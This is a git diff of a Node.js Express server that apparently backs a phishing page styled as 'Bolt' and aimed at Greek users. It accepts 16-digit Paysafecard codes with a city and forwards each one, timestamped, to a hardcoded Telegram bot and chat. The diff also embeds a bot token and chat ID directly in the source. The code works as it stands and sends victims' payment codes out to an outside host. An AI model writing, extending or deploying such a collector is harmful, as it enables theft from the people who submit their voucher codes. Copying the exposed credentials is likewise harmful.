@@ -1,21 +1,20 @@
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
-const dotenv = require('dotenv');
-
-dotenv.config();   // Load .env file
 
 const app = express();
-
 app.use(cors());
 app.use(express.json());
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+// === YOUR CREDENTIALS ===
+const TELEGRAM_BOT_TOKEN = "8657922544:AAEHvZPbio2Jp4g6J1Hpvxw8moCFKV3t8LU";
+const TELEGRAM_CHAT_ID = "8131922175";
+// =========================
 
-if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    console.error("❌ Missing Telegram credentials in .env file!");
-}
+const cityMap = {
+    "Αθήνα": "Athens",
+    "Θεσσαλονίκη": "Thessaloniki"
+};
 
 app.post('/submit', async (req, res) => {
     const { code, city } = req.body;
@@ -23,6 +22,8 @@ app.post('/submit', async (req, res) => {
     if (!code || code.length < 16) {
         return res.status(400).json({ error: 'Invalid code' });
     }
+
+    const displayCity = cityMap[city] || city || 'Unknown';
 
     const time = new Date().toLocaleString('en-GB', { 
         timeZone: 'Europe/Athens',
@@ -35,26 +36,23 @@ app.post('/submit', async (req, res) => {
 
     const message = `🔴 New Bolt Entry!\n\n` +
                     `Site: Bolt\n` +
-                    `Location: ${city || 'Not selected'}\n` +
+                    `Location: ${displayCity}\n` +
                     `Paysafecard 16 digit code: ${code}\n` +
                     `Time: ${time}`;
 
     try {
         await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'HTML'
+            text: message
         });
 
-        console.log(`✅ New code received from ${city}: ${code}`);
+        console.log(`✅ Code received from ${displayCity}`);
         res.json({ success: true });
     } catch (err) {
-        console.error("Telegram Error:", err.message);
-        res.status(500).json({ error: 'Failed to send to Telegram' });
+        console.error("Error:", err.message);
+        res.status(500).json({ error: 'Telegram failed' });
     }
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
